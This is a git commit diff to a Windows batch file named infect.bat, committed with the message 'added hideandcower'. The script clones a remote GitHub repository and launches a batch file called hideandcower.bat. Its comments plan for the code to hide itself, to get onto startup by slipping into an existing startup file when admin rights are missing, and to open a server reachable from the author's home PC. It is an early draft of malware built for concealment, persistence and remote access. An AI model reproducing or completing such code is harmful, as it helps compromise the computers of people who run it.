c562edeec28a209f77aaa503168b446306e4ac5b
PayPrawn <finlay.scott@rocketmail.com>
2018-08-23 19:05:07 +0100

    added hideandcower

--- infect.bat
+++ infect.bat
@@ -1,5 +1,14 @@
-:: find a way to make this put itself in a position where it will not be found
+:: find a way to make this put itself in a position where it will not 
+:: be found
 mkdir Repositories
 cd Repositories
 git clone "https://www.github.com/PayPrawn/binrepo.git"
-start githubcrack2
+cd Scraper
+start hideandcower.bat
+
+:: open on startup, cannot do it straight because it needs
+:: admin priveledges. However, maybe putting it into another file 
+:: currently in start up may be possible. 
+:: make a server/webpage
+:: find a way to access it using python. 
+:: use home pc to access it. 
